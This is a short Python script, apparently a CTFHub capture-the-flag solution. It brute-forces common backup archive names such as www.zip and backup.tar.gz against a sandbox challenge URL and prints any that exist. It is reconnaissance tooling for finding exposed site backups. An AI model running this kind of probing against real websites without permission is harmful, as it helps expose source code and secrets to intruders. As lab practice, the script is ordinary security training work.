import requests
suffixes = {"tar","tar.gz","zip","rar"}

filenames = {"web","website","backup","back","www","wwwroot","temp"}

for name in filenames:
    for suffix in suffixes:
        url = "http://challenge-63d0ecd25273d260.sandbox.ctfhub.com:10800/{}.{}".format(name,suffix)
        r = requests.get(url)
        if(r.status_code == 200):
            print("find: {}".format(url))